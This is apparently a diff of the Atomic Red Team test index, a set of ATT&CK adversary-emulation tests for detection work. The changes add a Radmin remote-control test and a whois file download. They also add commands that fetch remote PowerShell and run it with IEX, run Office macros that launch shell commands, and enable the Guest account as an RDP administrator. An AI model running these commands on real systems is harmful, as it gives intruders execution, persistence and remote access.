       - Shane Tully, @securitygypsy
-    atomic_tests: []
+      identifier: T1072
+    atomic_tests:
+    - name: Radmin Viewer Utility
+      auto_generated_guid: b4988cad-6ed2-434d-ace5-ea2670782129
+      description: 'An adversary may use Radmin Viewer Utility to remotely control
+        Windows device, this will start the radmin console.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        radmin_installer:
+          description: Radmin Viewer installer
+          type: Path
+          default: "%TEMP%\\RadminViewer.msi"
+        radmin_exe:
+          description: The radmin.exe executable from RadminViewer.msi
+          type: Path
+          default: "%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"
+      dependencies:
+      - description: 'Radmin Viewer Utility must be installed at specified location
+          (#{radmin_exe})
+
+'
+        prereq_command: 'if not exist "#{radmin_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading radmin installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi" #{radmin_installer}
+          msiexec /i "#{radmin_installer}" /qn
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: '"#{radmin_exe}"'
   T1153:
     technique:
       id: attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0
@@ -60546,7 +61137,8 @@ execution:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
         cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
           -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
@@ -60583,7 +61175,8 @@ execution:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
           -officeProduct \"Word\" -sub \"Extract\"\n"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin"
@@ -62428,7 +63021,41 @@ lateral-movement:
       x_mitre_remote_support: true
       x_mitre_contributors:
       - Shane Tully, @securitygypsy
-    atomic_tests: []
+      identifier: T1072
+    atomic_tests:
+    - name: Radmin Viewer Utility
+      auto_generated_guid: b4988cad-6ed2-434d-ace5-ea2670782129
+      description: 'An adversary may use Radmin Viewer Utility to remotely control
+        Windows device, this will start the radmin console.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        radmin_installer:
+          description: Radmin Viewer installer
+          type: Path
+          default: "%TEMP%\\RadminViewer.msi"
+        radmin_exe:
+          description: The radmin.exe executable from RadminViewer.msi
+          type: Path
+          default: "%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"
+      dependencies:
+      - description: 'Radmin Viewer Utility must be installed at specified location
+          (#{radmin_exe})
+
+'
+        prereq_command: 'if not exist "#{radmin_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading radmin installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi" #{radmin_installer}
+          msiexec /i "#{radmin_installer}" /qn
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: '"#{radmin_exe}"'
   T1080:
     technique:
       id: attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c
@@ -64253,6 +64880,55 @@ command-and-control:
           del #{local_path} >nul 2>&1
           del %temp%\MpCmdRun.log >nul 2>&1
         name: command_prompt
+    - name: whois file download
+      auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
+      description: 'Download a remote file using the whois utility
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_host:
+          description: Remote hostname or IP address
+          type: String
+          default: localhost
+        remote_port:
+          description: Remote port to connect to
+          type: Integer
+          default: 8443
+        output_file:
+          description: Path of file to save output to
+          type: Path
+          default: "/tmp/T1105.whois.out"
+        query:
+          description: Query to send to remote server
+          type: String
+          default: Hello from Atomic Red Team test T1105
+        timeout:
+          description: Timeout period before ending process (seconds)
+          type: Integer
+          default: 1
+      dependencies:
+      - description: 'The whois and timeout commands must be present
+
+'
+        prereq_command: 'which whois && which timeout
+
+'
+        get_prereq_command: 'echo "Please install timeout and the whois package"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'timeout --preserve-status #{timeout} whois -h #{remote_host} -p
+          #{remote_port} "#{query}" > #{output_file}
+
+'
+        cleanup_command: 'rm -f #{output_file}
+
+'
   T1090.001:
     technique:
       external_references:
@@ -66948,9 +67624,9 @@ initial-access:
     atomic_tests:
     - name: Enable Guest account with RDP capability and admin priviliges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
-      description: After execution the Default Guest account will be enabled (Active)
-        and added to Administrators and Remote Desktop Users Group, and desktop will
-        allow multiple RDP connections
+      description: |
+        After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
+        and desktop will allow multiple RDP connections.
       supported_platforms:
       - windows
       input_arguments:
@@ -66962,6 +67638,10 @@ initial-access:
           description: Specify the guest password
           type: String
           default: Password123!
+        remove_rdp_access_during_cleanup:
+          description: Set to 1 if you want the cleanup to remove RDP access to machine
+          type: Integer
+          default: 0
       executor:
         command: |-
           net user #{guest_user} /active:yes
@@ -66974,8 +67654,9 @@ initial-access:
           net user #{guest_user} /active:no >nul 2>&1
           net localgroup administrators #{guest_user} /delete >nul 2>&1
           net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
+          if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -67642,6 +68323,7 @@ initial-access:
       description: |
         The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
         The below will successfully download the macro-enabled Excel file to the current location.
+        File is downloaded to the %temp% folder.
       supported_platforms:
       - windows
       executor:
@@ -67650,13 +68332,13 @@ initial-access:
             return 'Please install Microsoft Excel before running this test.'
           }
           else{
-            $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+            $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
             $fileName = 'PhishingAttachment.xlsm'
             New-Item -Type File -Force -Path $fileName | out-null
             $wc = New-Object System.Net.WebClient
             $wc.Encoding = [System.Text.Encoding]::UTF8
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            ($wc.DownloadString("$url")) | Out-File $fileName
+            Invoke-WebRequest -Uri $url -OutFile $fileName
           }
         name: powershell
     - name: Word spawned a command shell and used an IP address in the command line
@@ -67695,7 +68377,8 @@ initial-access:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
         cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
